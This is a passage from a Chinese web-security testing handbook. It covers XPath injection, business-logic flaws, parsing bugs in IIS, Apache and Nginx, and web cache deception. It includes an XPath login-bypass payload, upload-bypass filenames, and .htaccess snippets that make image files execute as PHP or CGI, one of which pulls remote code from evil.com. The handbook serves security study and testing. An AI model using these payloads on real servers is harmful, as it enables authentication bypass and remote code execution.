style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 295px;"></div><div class="CodeMirror-gutters" style="height: 295px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><p><span>则 在 XPath 中 其 典 型 的 查 询 语 句 为：//users/user</span><span>[</span><span>loginID/text()=</span><span>&#39;</span><span>xyz</span><span>&#39;</span><span>and password/ text()=</span><span>&#39;</span><span>123test</span><span>&#39;</span><span>]</span></p><p><span>但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用户传入一个 login 和 password，例如 loginID = </span><span>&#39;</span><span>xyz</span><span>&#39;</span><span> 和 password = </span><span>&#39;</span><span>123test</span><span>&#39;</span><span> ，则该查询语句将返回 true。但如果用户传入类似 </span><span>&#39;</span><span> or 1=1 or </span><span>&#39;</span><span>&#39;</span><span>=</span><span>&#39;</span><span> 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：//users/ user</span><span>[</span><span>loginID/text()=</span><span>&#39;</span><span>&#39;</span><span>or 1=1 or </span><span>&#39;</span><span>&#39;</span><span>=</span><span>&#39;</span><span>&#39;</span><span> and password/text()=</span><span>&#39;</span><span>&#39;</span><span> or 1=1 or </span><span>&#39;</span><span>&#39;</span><span>=</span><span>&#39;</span><span>&#39;</span><span>]</span></p><p><span>这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过 XPath 盲入技术获取最高权限帐号和其它重要文档信息。</span></p></blockquote><h2 id='413--逻辑漏洞--业务漏洞'><span>4.13  逻辑漏洞 / 业务漏洞</span></h2><h3 id='4131--简介'><span>4.13.1  简介</span></h3><blockquote><p><span>逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。</span></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>在实际开发中，因为开发者水平不一没有安全意识，而 业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。</span></p></blockquote><h3 id='4132--安装逻辑'><span>4.13.2  安装逻辑</span></h3><ul><li><span>查看能否绕过判定重新安装</span></li><li><span>查看能否利用安装文件获取信息</span></li><li><span>看能否利用更新功能获取信息</span></li></ul><h3 id='4133--交易'><span>4.13.3  交易</span></h3><h4 id='购买'><span>购买</span></h4><ul><li><span>修改支付的价格</span></li><li><span>修改支付的状态</span></li><li><span>修改购买数量为负数</span></li><li><span>修改金额为负数</span></li><li><span>重放成功的请求</span></li><li><span>并发数据库锁处理不当</span></li></ul><h4 id='业务风控'><span>业务风控</span></h4><ul><li><span>刷优惠券</span></li><li><span>套现</span></li></ul><h3 id='4134--账户'><span>4.13.4  账户</span></h3><h4 id='注册'><span>注册</span></h4><ul><li><span>覆盖注册</span></li><li><span>尝试重复用户名</span></li><li><span>注册遍历猜解已有账号</span></li></ul><h4 id='密码'><span>密码</span></h4><ul><li><span>密码未使用哈希算法保存</span></li><li><span>没有验证用户设置密码的强度</span></li></ul><h4 id='邮箱用户名'><span>邮箱用户名</span></h4><ul><li><span>前后空格</span></li><li><span>大小写变换</span></li></ul><h4 id='cookie'><span>Cookie</span></h4><ul><li><span>包含敏感信息</span></li><li><span>未验证合法性可伪造</span></li></ul><h4 id='手机号用户名'><span>手机号用户名</span></h4><ul><li><span>前后空格</span></li><li><span>+86</span></li></ul><h4 id='登录'><span>登录</span></h4><ul><li><p><strong><span>撞库</span></strong></p><ul><li><span>设置异地登录检查等机制</span></li></ul></li><li><p><span>账号劫持</span></p></li><li><h5 id='恶意尝试帐号密码锁死账户'><span>恶意尝试帐号密码锁死账户</span></h5><ul><li><span>需要设置锁定机制与解锁机制</span></li></ul></li><li><p><span>不安全的传输信道</span></p></li><li><p><span>登录凭证存储在不安全的位置</span></p></li></ul><h4 id='找回密码'><span>找回密码</span></h4><ul><li><span>重置任意用户密码</span></li><li><span>密码重置后新密码在返回包中</span></li><li><span>Token 验证逻辑在前端</span></li><li><span>X-Forwarded-Host 处理不正确</span></li><li><span>找回密码功能泄露用户敏感信息</span></li></ul><h4 id='修改密码'><span>修改密码</span></h4><ul><li><span>越权修改密码</span></li><li><span>修改密码没有旧密码验证</span></li></ul><h4 id='申诉'><span>申诉</span></h4><ul><li><span>身份伪造</span></li><li><span>逻辑绕过</span></li></ul><h4 id='更新'><span>更新</span></h4><ul><li><span>ORM 更新操作不当可更新任意字段</span></li><li><span>权限限制不当可以越权修改</span></li></ul><h4 id='信息查询'><span>信息查询</span></h4><ul><li><span>权限限制不当可以越权查询</span></li><li><span>用户信息 ID 可以猜测导致遍历</span></li></ul><h3 id='4135--2fa'><span>4.13.5  2FA</span></h3><ul><li><span>重置密码后自动登录没有 2FA</span></li><li><span>OAuth 登录没有启用 2FA</span></li><li><span>2FA 可爆破</span></li><li><span>2FA 有条件竞争</span></li><li><span>修改返回值绕过</span></li><li><span>激活链接没有启用 2FA</span></li><li><span>可通过 CSRF 禁用 2FA</span></li></ul><h3 id='4136--验证码'><span>4.13.6  验证码</span></h3><ul><li><span>验证码可重用</span></li><li><span>验证码可预测</span></li><li><span>验证码强度不够</span></li><li><span>验证码无时间限制或者失效时间长</span></li><li><span>验证码无猜测次数限制</span></li><li><span>验证码传递特殊的参数或不传递参数绕过</span></li><li><span>验证码可从返回包中直接获取</span></li><li><span>验证码不刷新或无效</span></li><li><span>验证码数量有限</span></li><li><span>验证码在数据包中返回</span></li><li><span>修改 Cookie 绕过</span></li><li><span>修改返回包绕过</span></li><li><span>验证码在客户端生成或校验</span></li><li><span>验证码可 OCR 或使用机器学习识别</span></li><li><span>验证码用于手机短信/邮箱轰炸</span></li></ul><h3 id='4137--session'><span>4.13.7  Session</span></h3><ul><li><span>Session 机制</span></li><li><span>Session 猜测 / 爆破</span></li><li><span>Session 伪造</span></li><li><span>Session 泄漏</span></li><li><span>Session Fixation</span></li></ul><h3 id='4138--越权'><span>4.13.8  越权</span></h3><ul><li><h4 id='未授权访问'><span>未授权访问</span></h4><ul><li><span>静态文件</span></li><li><span>通过特定 url 来防止被访问</span></li></ul></li><li><h4 id='水平越权'><span>水平越权</span></h4><ul><li><span>攻击者可以访问与他拥有相同权限的用户的资源</span></li><li><span>权限类型不变，ID 改变</span></li></ul></li><li><h4 id='垂直越权'><span>垂直越权</span></h4><ul><li><span>低级别攻击者可以访问高级别用户的资源</span></li><li><span>权限 ID 不变，类型改变</span></li></ul></li><li><h4 id='交叉越权'><span>交叉越权</span></h4><ul><li><span>权限 ID 改变，类型改变</span></li></ul></li></ul><h3 id='4139--随机数安全'><span>4.13.9  随机数安全</span></h3><ul><li><span>使用不安全的随机数发生器</span></li><li><span>使用时间等易猜解的因素作为随机数种子</span></li></ul><h3 id='41310--其他'><span>4.13.10  其他</span></h3><ul><li><span>用户/订单/优惠券等 ID 生成有规律，可枚举</span></li><li><span>接口无权限、次数限制</span></li><li><span>加密算法实现误用</span></li><li><span>执行顺序</span></li><li><span>敏感信息泄露</span></li></ul><h3 id='41311--参考链接'><span>4.13.11  参考链接</span></h3><ul><li><a href='http://blog.csdn.net/mylutte/article/details/50819146#10006-weixin-1-52626-6b3bffd01fdde4900130bc5a2751b6d1'><span>水平越权漏洞及其解决方案</span></a></li><li><a href='https://xz.aliyun.com/t/6029'><span>细说验证码安全测试思路大梳理</span></a></li></ul><p>&nbsp;</p><h2 id='414--配置与策略安全'><span>4.14  配置与策略安全</span></h2><h3 id='4141--认证策略'><span>4.14.1  认证策略</span></h3><h4 id='密码策略'><span>密码策略</span></h4><ul><li><p><span>未限制密码最低位数</span></p></li><li><p><span>未限制密码必须包含字符集</span></p></li><li><p><span>为常用密码</span></p></li><li><h5 id='个人信息相关'><span>个人信息相关</span></h5><ul><li><span>手机号</span></li><li><span>生日</span></li><li><span>姓名</span></li><li><span>用户名</span></li></ul></li><li><h5 id='未检测常见弱密码'><span>未检测常见弱密码</span></h5><ul><li><span>已泄露的常用密码</span></li><li><span>键盘模式</span></li></ul></li></ul><h4 id='加密实现'><span>加密实现</span></h4><ul><li><span>在客户端存储私钥</span></li></ul><h3 id='4142--权限配置'><span>4.14.2  权限配置</span></h3><ul><li><span>运维人员权限粒度过大</span></li><li><span>客服人员权限粒度过大</span></li></ul><h3 id='4143--供应链安全'><span>4.14.3  供应链安全</span></h3><h4 id='三方认证'><span>三方认证</span></h4><ul><li><span>利用被攻击的第三方服务账号登录其他平台账号</span></li></ul><h4 id='三方库软件'><span>三方库/软件</span></h4><ul><li><span>公开漏洞后没有及时更新</span></li></ul><h2 id='415--中间件'><span>4.15  中间件</span></h2><h3 id='4151--iis'><span>4.15.1  IIS</span></h3><h4 id='iis-60'><span>IIS 6.0</span></h4><ul><li><p><strong><span>后缀解析 /xx.asp;.jpg</span></strong></p><ul><li><span>服务器默认不解析 ; 号及其后面的内容，相当于截断。</span></li></ul></li><li><p><span>目录解析 /xx.asp/xx.jpg (xx.asp 目录下任意解析)</span></p></li><li><p><span>默认解析 xx.asa xx.cer xx.cdx</span></p></li><li><p><span>PROPFIND 栈溢出漏洞</span></p></li><li><p><span>RCE CVE-2017-7269</span></p></li></ul><h4 id='iis-70-75--nginx--0837'><span>IIS 7.0-7.5 / Nginx </span><span>&lt;</span><span>= 0.8.37</span></h4><p><span>在 Fast-CGI 开启状态下，在文件路径后加上 /xx.php ，即 xx.jpg/xx.php 会被解析为 php 文件。</span></p><h4 id='put-漏洞'><span>PUT 漏洞</span></h4><ul><li><span>开启 WebDAV</span></li><li><span>拥有来宾用户， 来宾用户拥有上传权限</span></li><li><span>可任意文件上传</span></li></ul><h4 id='windows-特性'><span>Windows 特性</span></h4><blockquote><p><span>Windows 不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用 xx. php</span><span>[</span><span>空格</span><span>]</span><span> ，xx.php.，xx.php/，xx.php::</span><span>$</span><span>DATA 上传脚本文件。</span></p></blockquote><h4 id='文件名猜解'><span>文件名猜解</span></h4><blockquote><p><span>在支持 NTFS 8.3 文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：</span></p></blockquote><ul><li><span>文件名为原文件名前 6 位字符加上 </span><span>~</span><span>1 ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。</span></li><li><span>后缀名不超过 3 位，超过部分会被截断</span></li><li><span>所有小写字母均转换成大写的字母</span></li><li><span>文件名后缀长度大于等于 4 或者总长度大于等于 9 时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件</span></li></ul><blockquote><p><span>IIS 8.0 之前的版本支持短文件名猜测的 HTTP 方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、 TRACE 六种，需要安装 ASP.NET。而 IIS 8.0 之后的版本只能通过 OPTIONS 和 TRACE 方法猜测成功，但是没有 ASP.NET 的限制。</span></p><p><span>这种方法的局限性在于：</span></p></blockquote><ul><li><span>文件夹名前 6 位字符带点</span>”<span>.</span>“<span>，扫描程序会认为是文件而不是文件夹，最终出现误报</span></li><li><span>不支持中文文件名</span></li></ul><blockquote><p><span>这种方法可以通过命令 fsutil behavior set disable8dot3 1 关闭 NTFS 8.3 文件格式的支持来修复。</span></p></blockquote><h4 id='参考链接-1'><span>参考链接</span></h4><ul><li><a href='https://xz.aliyun.com/t/2318'><span>利用 Windows 特性高效猜测目录</span></a></li><li><a href='https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/'><span>Uploading web.config for Fun and Profit 2</span></a></li></ul><h3 id='4152--apache'><span>4.15.2  Apache</span></h3><h4 id='后缀解析'><span>后缀解析</span></h4><blockquote><p><span>test.php.x1.x2.x3 （x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀，若 x3 为非可识别后缀，则判断 x2，直到找到可识别后缀为止，然后对可识别后缀进行解析</span></p></blockquote><h4 id='htaccess'><span>.htaccess</span></h4><blockquote><p><span>当 AllowOverride 被启用时，上传启用解析规则的.htaccess</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">AddType</span> <span class="cm-variable">application</span><span class="cm-operator">/</span><span class="cm-variable">x</span><span class="cm-operator">-</span><span class="cm-variable">httpd</span><span class="cm-operator">-</span><span class="cm-variable">php</span> .<span class="cm-variable">jpg</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_value</span> <span class="cm-variable">auto_append_file</span> .<span class="cm-variable">htaccess</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#&lt;?php phpinfo();</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Options</span> <span class="cm-variable">ExecCGI</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">AddHandler</span> <span class="cm-variable">cgi</span><span class="cm-operator">-</span><span class="cm-variable">script</span> .<span class="cm-variable">jpg</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Options</span> <span class="cm-operator">+</span><span class="cm-variable">ExecCGI</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">AddHandler</span> <span class="cm-variable">fcgid</span><span class="cm-operator">-</span><span class="cm-variable">script</span> .<span class="cm-variable">gif</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">FcgidWrapper</span> <span class="cm-string">"/bin/bash"</span> .<span class="cm-variable">gif</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>4</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_flag</span> <span class="cm-variable">allow_url_include</span> <span class="cm-number">1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">php_value</span> <span class="cm-variable">auto_append_file</span> <span class="cm-variable">data</span>:<span class="cm-comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#php_value auto_append_file https://evil.com/evil-code.txt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 91px;"></div><div class="CodeMirror-gutters" style="height: 91px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></blockquote><h4 id='目录遍历-1'><span>目录遍历</span></h4><blockquote><p><span>配置 Options +Indexes 时 Apache 存在目录遍历漏洞。</span></p></blockquote><h4 id='cve-2017-15715'><span>CVE-2017-15715</span></h4><p><span>%0A 绕过上传黑名单。 </span></p><h4 id='lighttpd'><span>lighttpd</span></h4><p><span>xx.jpg/xx.php</span></p><h4 id='参考链接-2'><span>参考链接</span></h4><ul><li><a href='https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html'><span>Apache 上传绕过</span></a></li></ul><h3 id='4153--nginx'><span>4.15.3  Nginx</span></h3><h4 id='fast-cgi-关闭'><span>Fast-CGI 关闭</span></h4><blockquote><p><span>在 Fast-CGI 关闭的情况下，Nginx 仍然存在解析漏洞：在文件路径 (xx.jpg) 后面加上 %00.php ，即 xx. jpg%00.php 会被当做 php 文件来解析</span></p></blockquote><h4 id='fast-cgi-开启'><span>Fast-CGI 开启</span></h4><blockquote><p><span>在 Fast-CGI 开启状态下，在文件路径后加上 /xx.php ，则 xx.jpg/xx.php 会被解析为 php 文件</span></p></blockquote><h4 id='cve-2013-4547'><span>CVE-2013-4547</span></h4><blockquote><p><span>a.jpg</span><span>\</span><span>x20</span><span>\</span><span>x00.php</span></p></blockquote><h4 id='配置错误'><span>配置错误</span></h4><h4 id='目录穿越'><span>目录穿越</span></h4><blockquote><p><span>如果配置中存在类似 location /foo { alias /bar/; } 的配置时，/foo../ 会被解析为 /bar/../ 从而导致目录穿越的发生。</span></p></blockquote><h4 id='目录遍历-2'><span>目录遍历</span></h4><blockquote><p><span>配置中 autoindex on 开启时，Nginx 中存在目录遍历漏洞。</span></p></blockquote><h4 id='参考链接-3'><span>参考链接</span></h4><ul><li><a href='http://www.91ri.org/9064.html'><span>CVE-2013-4547 Nginx 解析漏洞深入利用及分析</span></a></li></ul><h2 id='416--web-cache-欺骗攻击'><span>4.16  Web Cache 欺骗攻击</span></h2><h3 id='4161--简介'><span>4.16.1  简介</span></h3><blockquote><p><span>网站通常都会通过如 CDN、负载均衡器、或者反向代理来实现 Web 缓存功能。通过缓存频繁访问的文件，降低服务器响应延迟。</span></p><p><span>例如，网站 </span><a href='http://www.example.com/'><span>htttp://www.example.com</span></a><span> 配置了反向代理。对于那些包含用户个人信息的页面，如 http:// </span><a href='http://www.example.com/home.php'><span>www.example.com/home.php</span></a><span> ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如 css 文件、js 文件、txt 文件、图</span></p><p><span>片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并 忽略 HTTP</span></p><p><span>缓存头。</span></p><p><span>Web cache 攻击类似于 RPO 相对路径重写攻击，都依赖于浏览器与服务器对 URL 的解析方式。当访问不存在的 URL 时，如 </span><a href='http://www.example.com/home.php/non-existent.css' target='_blank' class='url'>http://www.example.com/home.php/non-existent.css</a><span> ，浏览器发送 get 请求，依赖于使用的技术与配置，服务器返回了页面 </span><a href='http://www.example.com/home.php' target='_blank' class='url'>http://www.example.com/home.php</a><span> 的内容，同时 URL 地址仍然是 </span><a href='http://www.example.com/home.php/non-existent.css' target='_blank' class='url'>http://www.example.com/home.php/non-existent.css</a><span>，http 头的内容也与直接访问 </span><a href='http://www/'><span>http://www.</span></a><span> example.com/home.php 相同，cacheing header、content-type（此处为 text/html）也相同。</span></p></blockquote><h3 id='4162--漏洞成因'><span>4.16.2  漏洞成因</span></h3><blockquote><p><span>当代理服务器设置为缓存静态文件并忽略这类文件的 caching header 时，访问 </span><a href='http://www.example.com/' target='_blank' class='url'>http://www.example.com/</a><span> home.php/no-existent.css 时，会发生什么呢？整个响应流程如下：</span></p></blockquote><ol start='' ><li><span>浏览器请求 </span><a href='http://www.example.com/home.php/no-existent.css' target='_blank' class='url'>http://www.example.com/home.php/no-existent.css</a><span> ;</span></li><li><span>服务器返回 </span><a href='http://www.example.com/home.php' target='_blank' class='url'>http://www.example.com/home.php</a><span> 的内容 (通常来说不会缓存该页面);</span></li><li><span>响应经过代理服务器;</span></li><li><span>代理识别该文件有 css 后缀;</span></li><li><span>在缓存目录下，代理服务器创建目录 home.php ，将返回的内容作为 non-existent.css 保存。</span></li></ol><h3 id='4163--漏洞利用'><span>4.16.3  漏洞利用</span></h3><blockquote><p><span>攻击者欺骗用户访问 </span><a href='http://www.example.com/home.php/logo.png?www.myhack58.com' target='_blank' class='url'>http://www.example.com/home.php/logo.png?www.myhack58.com</a><span> , 导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含 session 标识、安全问题的答案，或者 csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。</span></p></blockquote><h3 id='4164--漏洞存在的条件'><span>4.16.4  漏洞存在的条件</span></h3><blockquote><p><span>漏洞要存在，至少需要满足下面两个条件：</span></p></blockquote><ol start='' ><li><span>web cache 